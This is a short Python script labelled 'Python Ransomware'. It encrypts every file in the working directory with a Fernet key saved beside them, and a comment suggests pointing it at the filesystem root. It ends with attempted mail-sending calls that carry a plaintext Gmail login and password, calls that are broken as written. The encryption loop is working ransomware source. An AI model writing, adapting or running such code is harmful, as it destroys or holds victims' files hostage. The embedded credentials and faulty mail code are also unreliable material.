#....Python Ransomware 
#.....Encryption part

import os
from cryptography.fernet import Fernet
import smtplib

#                   Instead of using () use ('/') to list the directory's from root .

files = []

directory = []

for file in os.listdir():
    if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)
    else:
        directory.append(file)

print(files)
print(directory)


key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encry =Fernet(key).encrypt(contents)

    with open(file,"wb") as thefile:
        thefile.write(contents_encry)

#...........SENDING MAIL USING SMTPLIB

smtplib.login('hackmertestme@gmail.com','testmejash123')

smtplib.send('hackmertestme@gmail.com','jaswanthr49839@gmail.com','hello')

print('mail sent..')

